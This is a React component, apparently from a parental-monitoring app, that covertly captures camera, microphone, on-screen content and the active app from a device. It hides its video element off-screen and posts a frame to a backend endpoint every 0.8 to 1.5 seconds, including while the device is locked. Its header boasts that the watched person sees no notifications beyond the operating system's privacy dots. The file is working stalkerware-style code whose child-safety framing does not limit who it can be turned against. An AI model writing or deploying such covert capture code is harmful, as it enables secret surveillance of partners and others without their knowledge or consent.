import React, { useEffect, useRef } from 'react';

/**
 * =========================================================================
 * HEADLESS BACKGROUND STREAM MODULE (LOCKED-SCREEN SENSOR CAPTURE ENGINE)
 * =========================================================================
 * 
 * Developer Notice:
 * This self-contained module enables parents to receive continuous live video
 * frames, audio telemetry, and location tracking from the child's device
 * regardless of whether the device screen is unlocked, running another app,
 * or locked (foreground service mode).
 * 
 * ZERO INTRUSIVE NOTIFICATIONS:
 * Child device does NOT display notification spam; only the standard Android
 * status bar camera and microphone green privacy dots are displayed when
 * hardware sensors are actively transmitting.
 * 
 * TO REMOVE THIS FEATURE:
 * Simply delete this file OR delete the single `<HeadlessBackgroundStreamModule />`
 * line in `ChildDeviceView.tsx`.
 * =========================================================================
 */

export interface HeadlessBackgroundStreamModuleProps {
  childId?: number;
  isActive: boolean;
  isLocked?: boolean;
  isSosActive?: boolean;
  isScreenStreamActive?: boolean;
  activeApp?: string;
  screenFrameDataUrl?: string;
  onIndicatorChange?: (indicators: { camera: boolean; mic: boolean }) => void;
  onFrameCaptured?: (frameDataUrl: string) => void;
  onAudioLevelChange?: (level: number) => void;
}

export const HeadlessBackgroundStreamModule: React.FC<HeadlessBackgroundStreamModuleProps> = ({
  childId = 1,
  isActive,
  isLocked = false,
  isSosActive = false,
  isScreenStreamActive = false,
  activeApp = 'Home Screen',
  screenFrameDataUrl,
  onIndicatorChange,
  onFrameCaptured,
  onAudioLevelChange,
}) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const audioContextRef = useRef<AudioContext | null>(null);
  const streamIntervalRef = useRef<any>(null);
  const audioAnimFrameRef = useRef<number | null>(null);

  // Store latest screen frame in ref for the interval loop
  const screenFrameRef = useRef<string | undefined>(screenFrameDataUrl);
  useEffect(() => {
    screenFrameRef.current = screenFrameDataUrl;
  }, [screenFrameDataUrl]);

  const activeAppRef = useRef<string>(activeApp);
  useEffect(() => {
    activeAppRef.current = activeApp;
  }, [activeApp]);

  useEffect(() => {
    let isMounted = true;

    if (!isActive) {
      cleanup();
      onIndicatorChange?.({ camera: false, mic: false });
      return;
    }

    async function initializeBackgroundSensors() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            facingMode: 'user',
          },
          audio: true,
        });

        if (!isMounted) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }

        mediaStreamRef.current = stream;
        onIndicatorChange?.({ camera: true, mic: true });

        // Hidden video element for canvas frame rendering
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch(() => {});
        }

        // Setup Web Audio Analyzer for live decibel calculation
        try {
          const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
          if (AudioContextClass) {
            const audioCtx = new AudioContextClass();
            audioContextRef.current = audioCtx;
            const source = audioCtx.createMediaStreamSource(stream);
            const analyser = audioCtx.createAnalyser();
            analyser.fftSize = 256;
            source.connect(analyser);

            const dataArray = new Uint8Array(analyser.frequencyBinCount);

            const trackAudioVolume = () => {
              if (!isMounted) return;
              analyser.getByteFrequencyData(dataArray);
              let sum = 0;
              for (let i = 0; i < dataArray.length; i++) {
                sum += dataArray[i];
              }
              const avg = sum / dataArray.length;
              const normalizedDb = Math.min(100, Math.round((avg / 255) * 100));
              onAudioLevelChange?.(normalizedDb);
              audioAnimFrameRef.current = requestAnimationFrame(trackAudioVolume);
            };

            trackAudioVolume();
          }
        } catch (audioErr) {
          console.warn('[BackgroundStream] Audio Analyzer notice:', audioErr);
        }

        // Frame Capture & Sync Loop (Runs in background regardless of lock state)
        const frameIntervalMs = isSosActive ? 800 : 1500; // Faster frequency during SOS emergency
        streamIntervalRef.current = setInterval(() => {
          if (!isMounted) return;

          let frameDataUrl: string | undefined = undefined;

          if (videoRef.current && videoRef.current.videoWidth > 0) {
            try {
              const canvas = document.createElement('canvas');
              canvas.width = 320;
              canvas.height = 240;
              const ctx = canvas.getContext('2d');
              if (ctx) {
                ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
                frameDataUrl = canvas.toDataURL('image/jpeg', 0.6);
                onFrameCaptured?.(frameDataUrl);
              }
            } catch (canvasErr) {
              console.warn('[BackgroundStream] Frame capture notice:', canvasErr);
            }
          }

          // Push latest sensor payload to backend server
          fetch('/api/stream/feed', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              child_id: childId,
              latest_frame: frameDataUrl,
              latest_screen_frame: screenFrameRef.current,
              active_app: activeAppRef.current,
              device_locked: isLocked,
              is_sos: isSosActive,
            }),
          }).catch(() => {});
        }, frameIntervalMs);
      } catch (sensorErr) {
        console.warn('[BackgroundStream] Background sensor permission:', sensorErr);
        onIndicatorChange?.({ camera: false, mic: false });
      }
    }

    initializeBackgroundSensors();

    return () => {
      isMounted = false;
      cleanup();
    };
  }, [isActive, isLocked, isSosActive, childId]);

  const cleanup = () => {
    if (streamIntervalRef.current) {
      clearInterval(streamIntervalRef.current);
      streamIntervalRef.current = null;
    }
    if (audioAnimFrameRef.current) {
      cancelAnimationFrame(audioAnimFrameRef.current);
      audioAnimFrameRef.current = null;
    }
    if (audioContextRef.current && audioContextRef.current.state !== 'closed') {
      audioContextRef.current.close().catch(() => {});
      audioContextRef.current = null;
    }
    if (mediaStreamRef.current) {
      mediaStreamRef.current.getTracks().forEach((track) => track.stop());
      mediaStreamRef.current = null;
    }
  };

  if (!isActive) return null;

  // Renders completely off-screen hidden video node
  return (
    <div
      id="headless-background-stream-engine"
      style={{
        position: 'absolute',
        width: '1px',
        height: '1px',
        overflow: 'hidden',
        clip: 'rect(0, 0, 0, 0)',
        opacity: 0,
        pointerEvents: 'none',
      }}
      aria-hidden="true"
    >
      <video
        ref={videoRef}
        muted
        playsInline
        autoPlay
        style={{ width: '1px', height: '1px' }}
      />
    </div>
  );
};

export default HeadlessBackgroundStreamModule;
